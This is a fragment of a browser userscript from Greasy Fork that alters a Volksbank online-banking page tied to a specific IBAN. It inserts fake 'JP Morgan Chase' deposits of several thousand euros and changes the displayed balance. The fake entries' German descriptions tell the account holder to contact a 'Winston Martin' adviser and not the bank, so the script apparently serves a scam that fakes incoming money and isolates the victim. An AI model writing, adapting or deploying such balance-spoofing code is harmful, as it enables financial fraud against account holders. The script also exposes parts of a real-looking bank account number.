// ==UserScript==
// @name         Ed AIX Volks Bernhard Fischer
...
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/495786/Ed%20AIX%20Volks%20Bernhard%20Fischer.user.js
// @updateURL https://update.greasyfork.org/scripts/495786/Ed%20AIX%20Volks%20Bernhard%20Fischer.meta.js
// ==/UserScript==
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    var targetTextContent1 = "DE39 6309 0100";
    var targetTextContent2 = " 0119 6000 05";
...
////            description: 'Geld für Steuern. Wenden Sie sich an Winston Martin Berater, nicht die Bank, damit nicht gesperrt.',
////            amount: '19.000,00',
 //           date: 'Gestern',
...
{
            title: 'JP Morgan Chase',
            description: 'Geld für Gebühren. Wenden Sie sich nur an Winston Martin Berater, nicht die Bank, damit nicht gesperrt.',
            amount: '7.000,00',
            date: 'Heute',
            insertAfter: false, // Set to false to insert before the original transaction
           moveSteps: 1, // Number of steps to move the transaction
...
{
            title: 'JP Morgan Chase',
            description: 'Geld für Steuern. Wenden Sie sich nur an Winston Martin Berater, nicht die Bank, damit nicht gesperrt.',
            amount: '23.000,00',
            date: 'Gestern',
            insertAfter: false, // Set to false to insert before the original transaction
           moveSteps: 1, // Number of steps to move the transaction
